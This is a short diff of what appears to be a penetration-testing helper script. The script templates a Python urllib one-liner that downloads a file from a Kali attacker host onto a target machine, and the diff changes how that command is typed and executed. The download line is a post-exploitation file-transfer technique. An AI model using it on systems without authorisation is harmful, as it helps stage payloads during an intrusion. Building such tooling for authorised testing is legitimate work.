@@ -16,5 +16,5 @@ SERVER_PORT=${form_data["server_port"]}
 SERVER_FILE=${form_data["server_file_location"]}
 LOCAL_FILE=${form_data["local_file_location"]}
 
-paste_command "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://${KALI_IP}:${PORT}/${SERVER_FILE}\", \"${LOCAL_FILE}\")'"
-xdotool key Return
+execute_command "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://${KALI_IP}:${PORT}/${SERVER_FILE}\", \"${LOCAL_FILE}\")'"
+create_new_line
